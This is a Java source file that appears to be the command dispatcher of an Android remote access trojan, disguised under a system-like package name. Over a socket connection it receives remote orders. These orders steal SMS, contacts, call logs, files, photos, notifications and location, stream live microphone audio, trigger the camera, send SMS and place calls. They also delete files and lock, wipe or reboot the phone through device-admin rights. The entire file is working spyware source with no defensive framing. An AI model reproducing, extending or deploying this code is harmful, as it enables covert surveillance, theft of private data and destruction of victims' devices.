package com.android.background.services;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.android.background.services.helpers.AppsListManager;
import com.android.background.services.helpers.CallsManager;
import com.android.background.services.helpers.CameraManager;
import com.android.background.services.helpers.ContactsManager;
import com.android.background.services.helpers.FileManager;
import com.android.background.services.helpers.LocManager;
import com.android.background.services.helpers.MicManager;
import com.android.background.services.helpers.MicRecorderManager;
import com.android.background.services.helpers.NetworkManager;
import com.android.background.services.helpers.NotificationsManager;
import com.android.background.services.helpers.OfflineLocationManager;
import com.android.background.services.helpers.SMSManager;
import com.android.background.services.helpers.Storage;

import org.apache.commons.io.FileUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;

import io.socket.emitter.Emitter;

public class ConnectionManager {

    private static final int REQUEST_RECORD_AUDIO_PERMISSION = 200;
    private static final int SAMPLE_RATE = 44100;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static AudioRecord audioRecord;
    private static boolean isRecording;

    @SuppressLint("StaticFieldLeak")
    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static OfflineLocationManager offlineLocationManager;

    public static void startAsync(Context con) {
        try {
            context = con;
            offlineLocationManager = new OfflineLocationManager(context);
            sendReq();
        } catch (Exception ex) {
            startAsync(con);
        }
    }


    public static void sendReq() {

        try {

            if (ioSocket != null)
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();


            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });

            // Sync offline locations when connected
            ioSocket.on("connect", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    syncOfflineLocations();
                }
            });

            // Handle sync response from server
            ioSocket.on("x0000syncOfflineLocationsResponse", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject response = (JSONObject) args[0];
                        boolean status = response.getBoolean("status");
                        String message = response.getString("message");
                        int count = response.getInt("count");
                        
                        if (status && count > 0) {
                            // Clear offline locations after successful sync
                            if (offlineLocationManager != null) {
                                offlineLocationManager.clearOfflineLocations();
                                Log.d("x0000syncOfflineLocationsResponse", 
                                    "Offline locations cleared after successful sync: " + count);
                            }
                        }
                        
                        Log.d("x0000syncOfflineLocationsResponse", message);
                    } catch (Exception e) {
                        Log.e("x0000syncOfflineLocationsResponse", "Error handling sync response", e);
                    }
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {

                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");

                        switch (order) {
                            case "x0000ca":
                                if (data.getString("extra").equals("camList"))
                                    x0000ca(-1);
                                else if (data.getString("extra").equals("1"))
                                    x0000ca(1);
                                else if (data.getString("extra").equals("0"))
                                    x0000ca(0);
                                break;

                            case "x0000fm":
                                if (data.getString("extra").equals("ls"))
                                    x0000fm(0, data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    x0000fm(1, data.getString("path"));
                                else if (data.getString("extra").equals("search"))
                                    x0000fmSearch(data.getString("fileType"), data.getString("searchPath"));
                                else if (data.getString("extra").equals("searchByName"))
                                    x0000fmSearchByName(data.getString("searchText"), data.getString("searchPath"));
                                break;
                            case "x0000st":
                                if (data.getString("extra").equals("ls"))
                                    x0000st(0, data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    x0000st(1, data.getString("path"));
                                break;
                            case "x0000sm":
                                if (data.getString("extra").equals("ls"))
                                    x0000sm(0, null, null);
                                else if (data.getString("extra").equals("sendSMS"))
                                    x0000sm(1, data.getString("to"), data.getString("sms"));
                                break;
                            case "x0000cl":
                                x0000cl();
                                break;
                            case "x0000cn":
                                x0000cn();
                                break;
                            case "x0000mc":
                                Log.d("x0000mc", "Deprecated. Use x0000startrecordmic instead.");
                                break;
                            case "x0000apps":
                                x0000apps();
                                break;
                            case "x0000lm":
                                x0000lm();
                                break;
                            case "x0000runApp":
                                x0000runApp(data.getString("extra"));
                                break;
                            case "x0000openUrl":
                                x0000openUrl(data.getString("url"));
                                break;
                            case "x0000deleteFF":
                                x0000deleteFF(data.getString("fileFolderPath"));
                                break;
                            case "x0000dm":
                                x0000dm(data.getString("number"));
                                break;
                            case "x0000lockDevice":
                                x0000lockDevice();
                                break;
                            case "x0000wipeDevice":
                                x0000wipeDevice();
                                break;
                            case "x0000rebootDevice":
                                x0000rebootDevice();
                                break;
                            case "x0000getAllImages":
                                sendImages();
                                break;
                            case "x0000listenMic":
                                listenMic();
                                break;
                            case "x0000stopstreammic":
                                stopMicStream();
                                break;
                            case "x0000startrecordmic":
                                MicManager.startRecording();
                                break;
                            case "x0000stoprecordmic":
                                MicManager.stopRecording();
                                break;
                            case "x0000startrecordmic2":
                                MicRecorderManager.start();
                                break;
                            case "x0000stoprecordmic2":
                                MicRecorderManager.stop();
                                break;
                            case "x0000nt":
                                x0000nt();
                                break;
                            case "x0000clearNt":
                                x0000clearNt();
                                break;
                            case "x0000clearSingleNt":
                                x0000clearSingleNt(data.getString("notificationKey"));
                                break;
                            case "x0000net":
                                x0000net();
                                break;
                            case "x0000wifi":
                                x0000wifi();
                                break;
                            case "x0000mobile":
                                x0000mobile();
                                break;
                            case "x0000wifiScan":
                                x0000wifiScan();
                                break;
                            case "x0000mobileDetail":
                                x0000mobileDetail();
                                break;
                            case "x0000syncOfflineLocations":
                                x0000syncOfflineLocations();
                                break;


                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();

        } catch (Exception ex) {
            Log.e("error", "");
        }
    }
    private static void listenMic() {
        if (isRecording){
            ioSocket.emit("audioDataStop", "stop");
            audioRecord.stop();
            isRecording = false;
        } else{
            initializeAudioRecording();
            isRecording = true;
        }
    }
    private static void stopMicStream() {
        if (isRecording && audioRecord != null) {
            try {
                audioRecord.stop();
                audioRecord.release();
                audioRecord = null;
                isRecording = false;
                Log.d("MicStream", "Mic stream stopped via x0000stopstreammic");
            } catch (Exception e) {
                Log.e("MicStream", "Error stopping mic stream", e);
            }
        }
    }

    private static boolean checkMicPermission() {
        int permission = ContextCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO);
        if (permission != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions((Activity) context, new String[]{android.Manifest.permission.RECORD_AUDIO}, REQUEST_RECORD_AUDIO_PERMISSION);
            return false;
        }
        return true;
    }

    private static void initializeAudioRecording() {

        if (checkMicPermission()){
            int minBufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
            audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, minBufferSize);

            if (audioRecord.getState() == AudioRecord.STATE_INITIALIZED) {
                audioRecord.startRecording();
                // Start recording and sending audio data to the server
                startAudioStream();
            } else {
                Log.e("AudioStream", "Audio recording initialization failed.");
            }
        } else {
            Log.d("Madara", "mic permission required.");
        }
    }

    private static void startAudioStream() {
        final int bufferSize = 4096; // Adjust buffer size as needed
        final byte[] audioData = new byte[bufferSize];

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                    audioRecord.read(audioData, 0, bufferSize);
                    byte[] sendData = Arrays.copyOf(audioData, audioData.length);
                    sendAudioData(sendData);
                }
            }
        }).start();
    }

    private static void sendAudioData(byte[] audioData) {
        String audioDataString = Base64.encodeToString(audioData, Base64.NO_WRAP);
        ioSocket.emit("audioData", audioDataString);
    }



    private static void sendImages() throws JSONException {

        JSONObject object = new JSONObject();

        ArrayList<String> imagePaths = getAllPhotos(context);

        for (int i = 0; i < imagePaths.size(); i++) {

            String imagePath = imagePaths.get(i);

            Bitmap originalBitmap = BitmapFactory.decodeFile(imagePath);

            int thumbnailWidth = 100; // Set your desired thumbnail width
            int thumbnailHeight = 100; // Set your desired thumbnail height
            Bitmap thumbnailBitmap = Bitmap.createScaledBitmap(originalBitmap, thumbnailWidth, thumbnailHeight, false);

            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            thumbnailBitmap.compress(Bitmap.CompressFormat.JPEG, 100, stream);
            byte[] thumbnailByteArray = stream.toByteArray();

            File file = new File(imagePath);
            String imageName = file.getName();

            object.put("imageName", imageName);
            object.put("imagePath", imagePath);
            object.put("imageBytes", thumbnailByteArray);
        }

        ioSocket.emit("x0000getAllImages", object);
    }

    private static ArrayList<String> getAllPhotos(Context context) {
        ArrayList<String> photoPaths = new ArrayList<>();

        // Define the URI for the external storage's MediaStore.Images
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        // Define the columns you want to retrieve
        String[] projection = {MediaStore.Images.Media.DATA};

        // Sort order (optional)
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        // Query the MediaStore to get all photos
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(uri, projection, null, null, sortOrder);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                String photoPath = cursor.getString(columnIndex);
                photoPaths.add(photoPath);
            }
            cursor.close();
        }

        return photoPaths;
    }

    private static void x0000rebootDevice() throws JSONException {
        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){

            MainActivity.devicePolicyManager.reboot(MainActivity.componentName);
            jsonObject.put("status", true);
            jsonObject.put("message", "Device rebooted successfully.");
        }
        else{
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit("x0000rebootDevice", jsonObject);
    }

    private static void x0000wipeDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
            MainActivity.devicePolicyManager.wipeData(1);
            jsonObject.put("status", true);
            jsonObject.put("message", "Device wiped out successfully.");
        }
        else{
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit("x0000lockDevice", jsonObject);
    }

    private static void x0000lockDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
            MainActivity.devicePolicyManager.lockNow();
            jsonObject.put("status", true);
            jsonObject.put("message", "Device locked.");
        }
        else{
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit("x0000lockDevice", jsonObject);
    }

    private static void x0000dm(String number) throws JSONException {

        JSONObject jsonObject = new JSONObject();

        try {

            Uri phoneNumber = Uri.parse("tel:"+number);
            Intent callIntent = new Intent(Intent.ACTION_CALL, phoneNumber);
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(callIntent);

            jsonObject.put("status", true);
        }
        catch (Exception e){
            jsonObject.put("status", false);
            e.printStackTrace();
        }
        ioSocket.emit("x0000dm", jsonObject);
    }

    private static void x0000deleteFF(String fileFolderPath) throws JSONException {

        JSONObject jsonObject = new JSONObject();

        File file = new File(fileFolderPath);

        if (file.isDirectory() && file.exists()){
            try {
                FileUtils.forceDelete(file);
                jsonObject.put("status", true);
            }
            catch (Exception e) {
                jsonObject.put("status", false);
                e.printStackTrace();
            }
        }
        else if (file.isFile() && file.exists()){
            jsonObject.put("status", file.delete());
        }

        ioSocket.emit("x0000deleteFF", jsonObject);
    }


    private static void x0000openUrl(String url) {
        Log.d("x0000openUrl", "Trying to open: " + url);
        JSONObject jsonObject = new JSONObject();

        try{
            Intent openIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            openIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(openIntent);
            jsonObject.put("status", true);
        }
        catch (Exception e){
            try {
                jsonObject.put("status", false);
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }
            e.printStackTrace();

        }
        ioSocket.emit("x0000openUrl", jsonObject);
    }


    private static void x0000runApp(String packageName) {

        JSONObject jsonObject = new JSONObject();

        Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);

        if (launchIntent != null) {
            try {
                jsonObject.put("launchingStatus", true);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            context.startActivity(launchIntent);
        }
        else {
            try {
                jsonObject.put("launchingStatus", false);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        ioSocket.emit("x0000runApp", jsonObject);
    }

    public static void x0000apps() {
        ioSocket.emit("x0000apps", AppsListManager.getAppLists(context));
    }

    public static void x0000ca(int req) {

        if (req == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if (cameraList != null)
                ioSocket.emit("x0000ca", cameraList);
        } else if (req == 1) {
            new CameraManager(context).startUp(1);
        } else if (req == 0) {
            new CameraManager(context).startUp(0);
        }
    }

    public static void x0000fm(int req, String path) {
        if (req == 0)
            ioSocket.emit("x0000fm", FileManager.walk(path));
        else if (req == 1)
            FileManager.downloadFile(path);
    }

    public static void x0000fmSearch(String fileType, String searchPath) {
        try {
            JSONObject response = new JSONObject();
            response.put("searchResults", FileManager.searchFilesByType(searchPath, fileType));
            ioSocket.emit("x0000fm", response);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public static void x0000fmSearchByName(String searchText, String searchPath) {
        try {
            JSONObject response = new JSONObject();
            response.put("searchResults", FileManager.searchFilesByName(searchPath, searchText));
            ioSocket.emit("x0000fm", response);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public static void x0000st(int req, String path) {
        if (req == 0)
            ioSocket.emit("x0000st", Storage.walk(path));
        else if (req == 1)
            Storage.downloadFile(path);
    }
    public static void x0000sm(int req, String phoneNo, String msg) {
        if (req == 0)
            ioSocket.emit("x0000sm", SMSManager.getSMSList());
        else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000cl() {
        ioSocket.emit("x0000cl", CallsManager.getCallsLogs());
    }

    public static void x0000cn() {
        ioSocket.emit("x0000cn", ContactsManager.getContacts());
    }

//    public static void x0000mc(int sec) throws Exception {
//        MicManager.startRecording(sec);
//    }

    public static void x0000lm() throws Exception {
        Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if (gps.canGetLocation()) {

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.e("loc", latitude + "   ,  " + longitude);
            location.put("enable", true);
            location.put("lat", latitude);
            location.put("lng", longitude);
            
            // Save to offline storage if not connected
            if (offlineLocationManager != null && (ioSocket == null || !ioSocket.connected())) {
                offlineLocationManager.saveLocation(latitude, longitude, 0, null);
                Log.d("x0000lm", "Location saved offline due to no connection");
            }
        } else
            location.put("enable", false);

        // Only emit if connected
        if (ioSocket != null && ioSocket.connected()) {
            ioSocket.emit("x0000lm", location);
        } else {
            Log.d("x0000lm", "Not connected, location saved offline only");
        }
    }

    public static void x0000nt() {
        try {
            JSONObject notifications = NotificationsManager.getNotifications();
            if (notifications != null) {
                ioSocket.emit("x0000nt", notifications);
            } else {
                // Gửi response rỗng nếu không có notifications
                JSONObject emptyResponse = new JSONObject();
                emptyResponse.put("notificationsList", new JSONArray());
                ioSocket.emit("x0000nt", emptyResponse);
            }
        } catch (Exception e) {
            Log.e("x0000nt", "Error getting notifications: " + e.getMessage());
            try {
                JSONObject errorResponse = new JSONObject();
                errorResponse.put("error", "Failed to get notifications: " + e.getMessage());
                ioSocket.emit("x0000nt", errorResponse);
            } catch (JSONException je) {
                je.printStackTrace();
            }
        }
    }

    public static void x0000clearNt() {
        try {
            boolean success = NotificationsManager.clearAllNotifications();
            JSONObject response = new JSONObject();
            response.put("status", success);
            response.put("message", success ? "All notifications cleared successfully" : "Failed to clear notifications");
            ioSocket.emit("x0000clearNt", response);
        } catch (Exception e) {
            Log.e("x0000clearNt", "Error clearing notifications: " + e.getMessage());
            try {
                JSONObject errorResponse = new JSONObject();
                errorResponse.put("status", false);
                errorResponse.put("message", "Error clearing notifications: " + e.getMessage());
                ioSocket.emit("x0000clearNt", errorResponse);
            } catch (JSONException je) {
                je.printStackTrace();
            }
        }
    }
    
    public static void x0000clearSingleNt(String notificationKey) {
        try {
            if (notificationKey != null && !notificationKey.isEmpty()) {
                boolean success = NotificationsManager.clearNotification(notificationKey);
                JSONObject response = new JSONObject();
                response.put("status", success);
                response.put("notificationKey", notificationKey);
                response.put("message", success ? "Notification cleared successfully" : "Failed to clear notification");
                ioSocket.emit("x0000clearSingleNt", response);
            } else {
                JSONObject errorResponse = new JSONObject();
                errorResponse.put("status", false);
                errorResponse.put("message", "Invalid notification key");
                ioSocket.emit("x0000clearSingleNt", errorResponse);
            }
        } catch (Exception e) {
            Log.e("x0000clearSingleNt", "Error clearing single notification: " + e.getMessage());
            try {
                JSONObject errorResponse = new JSONObject();
                errorResponse.put("status", false);
                errorResponse.put("message", "Error clearing notification: " + e.getMessage());
                ioSocket.emit("x0000clearSingleNt", errorResponse);
            } catch (JSONException je) {
                je.printStackTrace();
            }
        }
    }

    /**
     * Lấy thông tin tổng hợp về mạng
     */
    public static void x0000net() {
        try {
            NetworkManager networkManager = new NetworkManager(context);
            JSONObject networkInfo = networkManager.getNetworkInfo();
            ioSocket.emit("x0000net", networkInfo);
        } catch (Exception e) {
            Log.e("x0000net", "Error getting network info: " + e.getMessage());
            try {
                JSONObject errorResponse = new JSONObject();
                errorResponse.put("error", "Failed to get network info: " + e.getMessage());
                ioSocket.emit("x0000net", errorResponse);
            } catch (JSONException je) {
                je.printStackTrace();
            }
        }
    }

    /**
     * Lấy thông tin WiFi
     */
    public static void x0000wifi() {
        try {
            NetworkManager networkManager = new NetworkManager(context);
            JSONObject wifiInfo = networkManager.getWifiInfo();
            ioSocket.emit("x0000wifi", wifiInfo);
        } catch (Exception e) {
            Log.e("x0000wifi", "Error getting WiFi info: " + e.getMessage());
            try {
                JSONObject errorResponse = new JSONObject();
                errorResponse.put("error", "Failed to get WiFi info: " + e.getMessage());
                ioSocket.emit("x0000wifi", errorResponse);
            } catch (JSONException je) {
                je.printStackTrace();
            }
        }
    }

    /**
     * Lấy thông tin mạng di động
     */
    public static void x0000mobile() {
        try {
            NetworkManager networkManager = new NetworkManager(context);
            JSONObject mobileInfo = networkManager.getMobileInfo();
            ioSocket.emit("x0000mobile", mobileInfo);
        } catch (Exception e) {
            Log.e("x0000mobile", "Error getting mobile info: " + e.getMessage());
            try {
                JSONObject errorResponse = new JSONObject();
                errorResponse.put("error", "Failed to get mobile info: " + e.getMessage());
                ioSocket.emit("x0000mobile", errorResponse);
            } catch (JSONException je) {
                je.printStackTrace();
            }
        }
    }

    /**
     * Quét các mạng WiFi có sẵn
     */
    public static void x0000wifiScan() {
        try {
            NetworkManager networkManager = new NetworkManager(context);
            JSONArray wifiNetworks = networkManager.getAvailableWifiNetworks();
            ioSocket.emit("x0000wifiScan", wifiNetworks);
        } catch (Exception e) {
            Log.e("x0000wifiScan", "Error scanning WiFi networks: " + e.getMessage());
            try {
                JSONObject errorResponse = new JSONObject();
                errorResponse.put("error", "Failed to scan WiFi networks: " + e.getMessage());
                ioSocket.emit("x0000wifiScan", errorResponse);
            } catch (JSONException je) {
                je.printStackTrace();
            }
        }
    }

    /**
     * Lấy thông tin chi tiết về mạng di động
     */
    public static void x0000mobileDetail() {
        try {
            NetworkManager networkManager = new NetworkManager(context);
            JSONObject mobileDetail = networkManager.getDetailedMobileInfo();
            ioSocket.emit("x0000mobileDetail", mobileDetail);
        } catch (Exception e) {
            Log.e("x0000mobileDetail", "Error getting mobile detail: " + e.getMessage());
            try {
                JSONObject errorResponse = new JSONObject();
                errorResponse.put("error", "Failed to get mobile detail: " + e.getMessage());
                ioSocket.emit("x0000mobileDetail", errorResponse);
            } catch (JSONException je) {
                je.printStackTrace();
            }
        }
    }

    /**
     * Sync offline locations to server
     */
    public static void x0000syncOfflineLocations() {
        try {
            if (offlineLocationManager != null && offlineLocationManager.hasOfflineLocations()) {
                JSONObject syncData = offlineLocationManager.getOfflineLocationsForSync();
                ioSocket.emit("x0000syncOfflineLocations", syncData);
                Log.d("x0000syncOfflineLocations", "Offline locations synced: " + 
                    offlineLocationManager.getOfflineLocationCount() + " locations");
            } else {
                JSONObject emptyResponse = new JSONObject();
                emptyResponse.put("locations", new JSONArray());
                emptyResponse.put("count", 0);
                ioSocket.emit("x0000syncOfflineLocations", emptyResponse);
            }
        } catch (Exception e) {
            Log.e("x0000syncOfflineLocations", "Error syncing offline locations: " + e.getMessage());
            try {
                JSONObject errorResponse = new JSONObject();
                errorResponse.put("error", "Failed to sync offline locations: " + e.getMessage());
                ioSocket.emit("x0000syncOfflineLocations", errorResponse);
            } catch (JSONException je) {
                je.printStackTrace();
            }
        }
    }

    /**
     * Sync offline locations when connection is established
     */
    private static void syncOfflineLocations() {
        if (offlineLocationManager != null && offlineLocationManager.hasOfflineLocations()) {
            // Delay sync to ensure connection is fully established
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                x0000syncOfflineLocations();
            }, 2000); // 2 second delay
        }
    }
}
